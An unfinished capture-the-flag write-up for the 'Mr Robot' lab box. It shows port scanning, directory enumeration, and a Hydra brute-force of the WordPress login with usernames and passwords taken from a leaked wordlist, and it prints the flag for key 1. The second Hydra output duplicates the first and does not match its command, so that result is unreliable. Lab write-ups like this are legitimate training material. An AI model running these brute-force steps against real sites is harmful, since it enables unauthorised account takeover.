# Mr Robot CTF
Based on the Mr. Robot show, can you root this box?

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

```
ip = 10.10.235.120
```

## Nmap

```
nmap -sC -sV -oN initial.log 10.10.235.120
```

>22/tcp  closed ssh
>
>80/tcp  open   http     Apache httpd
>
>443/tcp open   ssl/http Apache httpd


## Task 1.

```
nikto -h http://10.10.235.120 | tee nikto.log
```

Using **gobuster** I'm going to scan `http://10.10.235.120 /` for hidden directories or files using a wordlist and checks specified file extensions like php or txt.

```
gobuster dir -u http://10.10.235.120 / -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,sh,cgi,html,css,js,py
```

Looking at `http://10.10.235.120/robots.txt` I find three strings:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

With the second one I download a file with a lot of strings accessing `http://10.10.235.120/fsocity.dic`. With the third one I obtain the first key accessing `http://10.10.235.120/key-1-of-3.txt`. After that with the iformation obtained I find a Wordpress login page. When I try to access with an user that doesnt exists I obtain: `ERROR: Invalid username.`. So, with Hydra I am going to try to obtain a valid username.

```
hydra -L fsocity.dict -p test 10.10.235.120 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-03 16:09:00
[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:858235/p:1), ~28608 tries per task
[DATA] attacking http-post-form://10.10.235.120:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
[80][http-post-form] host: 10.10.235.120   login: Elliot   password: test

```

```
hydra -l Elliot -P fsocity.dict 10.10.235.120 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered" -t 30

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-03 16:09:00
[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:858235/p:1), ~28608 tries per task
[DATA] attacking http-post-form://10.10.235.120:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
[80][http-post-form] host: 10.10.235.120   login: Elliot   password: test

```



### Questions

1. What is key 1?
    >073403c8a58a1f80d943455fb30724b9
2. What is key 2?

3. What is key 3?